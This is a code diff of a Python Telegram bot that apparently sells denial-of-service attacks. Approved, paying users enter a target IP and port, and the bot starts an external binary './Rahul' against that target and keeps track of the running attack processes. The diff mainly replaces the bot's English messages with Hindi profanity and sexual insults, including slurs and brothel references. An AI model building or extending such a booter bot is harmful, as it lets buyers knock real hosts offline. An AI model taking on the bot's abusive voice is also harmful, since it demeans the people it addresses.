@@ -108,12 +108,12 @@ def check_user_approval(user_id):
 
 # Send a not approved message
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*MADARCHOD BAAP SE APPROVE LELE", parse_mode='Markdown')
 
 # Run attack command synchronously
 def run_attack_command_sync(target_ip, target_port, action):
     if action == 1:
-        process = subprocess.Popen(["./rahul", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./Rahul", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[(target_ip, target_port)] = process.pid
     elif action == 2:
         pid = active_attacks.pop((target_ip, target_port), None)
@@ -125,9 +125,9 @@ def run_attack_command_sync(target_ip, target_port, action):
                 print(f"Failed to kill process with PID {pid}: {e}")
 
 # Buttons
-btn_attack = telebot.types.KeyboardButton("Attack")
-btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
-btn_stop = telebot.types.KeyboardButton("Stop Attack")
+btn_attack = telebot.types.KeyboardButton("😈Attack1👿")
+btn_start = telebot.types.KeyboardButton("😡Start Attack 🚀")
+btn_stop = telebot.types.KeyboardButton("😅Stop Attack😅")
 
 markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
 markup.add(btn_attack, btn_start, btn_stop)
@@ -141,8 +141,8 @@ def send_welcome(message):
         return
 
     username = message.from_user.username
-    welcome_message = (f"Welcome, {username}!\n\n"
-                       f"Please choose an option below to continue.")
+    welcome_message = (f"WELCOME TO SONAGACHI, RANDI KHANA M APKA SUYAGAT HAI"
+                       f"KISKE SATH SONA H CHOOSE KARLE MADARCHOD ")
 
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
 verify()
@@ -156,7 +156,7 @@ def approve_list_command(message):
         approved_users = [user for user in users if user['plan'] > 0]
 
         if not approved_users:
-            bot.send_message(message.chat.id, "No approved users found.")
+            bot.send_message(message.chat.id, "KOI COSTOMER NAHI H AJJ")
         else:
             response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
             bot.send_message(message.chat.id, response, parse_mode='Markdown')
@@ -170,7 +170,7 @@ def approve_or_disapprove_user(message):
     cmd_parts = message.text.split()
 
     if not is_user_admin(user_id):
-        bot.send_message(chat_id, "*NOT APPROVED*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*NIKAL MADARCHOD CHODNE AYA THA", parse_mode='Markdown')
         return
 
     if len(cmd_parts) < 2:
@@ -189,12 +189,12 @@ def approve_or_disapprove_user(message):
         users.append(user_info)
         save_users(users)
 
-        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
+        msg_text = f"*COSTOMER KO{target_user_id} CHODNEKE  {plan} LIYE {days} ANDAR JANEDIYA"
     else:  # disapprove
         users[:] = [user for user in users if user['user_id'] != target_user_id]
         save_users(users)
 
-        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
+        msg_text = f"*NIKAL JA {target_user_id} CHODNA NAHI STA HAI MADARCHOD"
 
     bot.send_message(chat_id, msg_text, parse_mode='Markdown')
 verify()
@@ -202,7 +202,7 @@ verify()
 @bot.message_handler(func=lambda message: message.text == 'Attack')
 def handle_attack_setup(message):
     chat_id = message.chat.id
-    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
+    msg = bot.send_message(chat_id, "CHODNE K LIYE PAILE PAISA OR CONDOM LAGALE")
     bot.register_next_step_handler(msg, save_ip_port)
 
 def save_ip_port(message):
@@ -212,7 +212,7 @@ def save_ip_port(message):
         ip_port = message.text.split()  # Split the input by space
 
         if len(ip_port) != 2:
-            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
+            bot.send_message(chat_id, "MADARCHOD SAHI SE CHODNA")
             return
 
         target_ip, target_port = ip_port
@@ -238,7 +238,7 @@ def run_attack_command_sync(target_ip, target_port, action):
 
     if action == 1:  # Start attack
         # Launch the attack process
-        process = subprocess.Popen(["./rahul", target_ip, str(target_port), "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./Rahul", target_ip, str(target_port), "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         # Store the PID of the running attack
         active_attacks[(target_ip, target_port)] = process.pid
     elif action == 2:  # Stop attack
@@ -251,9 +251,9 @@ def run_attack_command_sync(target_ip, target_port, action):
             except subprocess.CalledProcessError as e:
                 logging.error(f"Failed to kill process with PID {pid}: {e}")
 # Buttons
-btn_attack = telebot.types.KeyboardButton("Attack")
-btn_start = telebot.types.KeyboardButton("Start Attack 🚀")
-btn_stop = telebot.types.KeyboardButton("Stop Attack")
+btn_attack = telebot.types.KeyboardButton("😈Attack👿")
+btn_start = telebot.types.KeyboardButton("😡Start Attack 🚀")
+btn_stop = telebot.types.KeyboardButton("😅Stop Attack😅")
 
 markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
 markup.add(btn_attack, btn_start, btn_stop)
@@ -267,8 +267,8 @@ def send_welcome(message):
         return
 
     username = message.from_user.username
-    welcome_message = (f"Welcome, {username}!\n\n"
-                       f"Please choose an option below to continue.")
+    welcome_message = (f"WELCOME TO SONAGACHI {username}!\n\n"
+                       f"YAHAPE APKA SUYAGAT HAI")
 
     bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
 
